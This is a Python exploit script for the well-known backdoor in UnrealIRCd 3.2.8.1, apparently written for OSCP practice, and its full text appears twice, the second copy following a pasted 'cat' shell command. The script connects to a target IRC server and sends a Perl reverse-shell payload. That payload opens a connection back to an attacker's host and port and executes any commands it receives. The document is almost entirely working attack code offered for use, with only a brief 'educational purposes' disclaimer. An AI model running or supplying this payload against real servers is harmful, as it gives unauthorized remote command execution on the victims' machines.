#!/usr/bin/python3
# Exploit Title: UnrealIRCd 3.2.8.1 Backdoor
# Date: 2020-09-23
# Exploit Author: Ranger11Danger (original), Spacial (python3 version)
# Software Link: UnreallRCd
# Version: 3.2.8.1
# Tested on: Linux Debian
#
# -- Example --
# root@kali:~# ./pwnedunircd.py <rhost> <rport> <lhost> <lport>
# 

import socket
import sys

if len(sys.argv) < 4:
    print('Missing arguments')
    print('Usage: ./pwnedunircd.py <rhost> <rport> <lhost> <lport>')
    sys.exit(1)

RHOST=sys.argv[1]
RPORT=int(sys.argv[2])
LHOST=sys.argv[3]
LPORT=sys.argv[4]

##################
#print("MADE BY :- SARTHAK/SPACIAL")
#print("			Referenced by:- Metasploit source code and https://github.com/geek-repo/UnrealIRCd-3.2.8.1")
#print("Original NOTE:-I MADE THIS DUE TO PEOPLE PREPARING FOR OSCP WANT TO DO EXPLOITATION MANUALLY AS WELL AS THE EXPLOIT-DB EXPLOIT DOESN'T SEEM TO BE WORKING IDK WHY :(\n")
#print("			Note: only for educational pourposes!!! ")
#print(" ================= starting exploit =================== ")



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST,RPORT))

a=s.recv(1024)

print("Sending payload :)")

#replace the ip and port with yours ...(YOUR IP AND PORT)
a="AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" 
a+=str(LHOST) + ':' +str(LPORT)
a+="\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
print(a)
s.sendall(a.encode(encoding='utf-8', errors='strict'))
print("Eyes on netcat sire 10...9...8...7...6...5..4..3...2..1..HAHA IT WILL COME :)")
print(" ================= exploit finished =================== ")
root@kali:/home/gohacking/offsec# cat unrealircd3.py
#!/usr/bin/python3
# Exploit Title: UnrealIRCd 3.2.8.1 Backdoor
# Date: 2020-09-23
# Exploit Author: Ranger11Danger (original), Spacial (python3 version)
# Software Link: UnreallRCd
# Version: 3.2.8.1
# Tested on: Linux Debian
#
# -- Example --
# root@kali:~# ./pwnedunircd.py <rhost> <rport> <lhost> <lport>
# 

import socket
import sys

if len(sys.argv) < 4:
    print('Missing arguments')
    print('Usage: ./pwnedunircd.py <rhost> <rport> <lhost> <lport>')
    sys.exit(1)

RHOST=sys.argv[1]
RPORT=int(sys.argv[2])
LHOST=sys.argv[3]
LPORT=sys.argv[4]

##################
#print("MADE BY :- SARTHAK/SPACIAL")
#print("			Referenced by:- Metasploit source code and https://github.com/geek-repo/UnrealIRCd-3.2.8.1")
#print("Original NOTE:-I MADE THIS DUE TO PEOPLE PREPARING FOR OSCP WANT TO DO EXPLOITATION MANUALLY AS WELL AS THE EXPLOIT-DB EXPLOIT DOESN'T SEEM TO BE WORKING IDK WHY :(\n")
#print("			Note: only for educational pourposes!!! ")
#print(" ================= starting exploit =================== ")



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST,RPORT))

a=s.recv(1024)

print("Sending payload :)")

#replace the ip and port with yours ...(YOUR IP AND PORT)
a="AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" 
a+=str(LHOST) + ':' +str(LPORT)
a+="\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
print(a)
s.sendall(a.encode(encoding='utf-8', errors='strict'))
print("Eyes on netcat sire 10...9...8...7...6...5..4..3...2..1..HAHA IT WILL COME :)")
print(" ================= exploit finished =================== ")
